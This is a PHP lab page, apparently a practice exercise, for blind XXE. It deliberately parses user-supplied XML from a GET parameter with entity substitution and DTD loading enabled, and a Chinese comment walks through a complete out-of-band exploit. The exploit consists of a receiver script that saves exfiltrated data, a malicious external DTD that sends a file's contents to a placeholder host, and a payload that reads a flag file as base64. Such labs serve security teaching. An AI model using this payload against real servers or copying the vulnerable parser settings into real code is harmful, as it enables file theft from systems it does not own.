<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
        <title>XXE(无回显)</title>
    </head>
    <body>
        <?php
            $xmlStr = $_GET['xml'];
            libxml_use_internal_errors(true);
            $xml = simplexml_load_string($xmlStr,"SimpleXMLElement",LIBXML_NOENT|LIBXML_DTDLOAD);
            if ($xml === false) {
                echo "Failed loading XML\n";
                foreach(libxml_get_errors() as $error) {
                    echo "\t", $error->message;
                }
                echo '<br />';
            }
            echo "<p>没有回显怎么办 (:(:(:</p>"

            /*
            绕过方法：

            在你的电脑里新建一个名为recv的php文件，即recv.php，假设这个php文件的url为http://xxx.xxx.xxx/recv.php，文件内容如下：

            <?php
                $data = $_GET['data'];
                $fp = fopen("data","w") or die("can not open file");
                fwrite($fp,$data);
                fclose($fp);
            ?>

            注意，如果已经存在了data这个文件，php要有可写的权限，如果没有存在data这个文件，php要有可以创建文件的权限

            
            在你的电脑里新建一个名为evil的dtd文件，即evil.dtd，假设这个dtd文件的url为http://xxx.xxx.xxx/evil.dtd，文件内容如下：
            
            <!ENTITY % all 
                "<!ENTITY &#x25; send SYSTEM 'http://xxx.xxx.xxx/recv.php?data=%file;'>"
            >
            %all;
            

            在nofeedback.html的输入框填入下面的内容
            <?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE xxe [
                <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=./flag">
                <!ENTITY % dtd SYSTEM "http://xxx.xxx.xxx/evil.dtd">
                %dtd;
                %send;
            ]>
            */
        ?>
    </body>
</html>
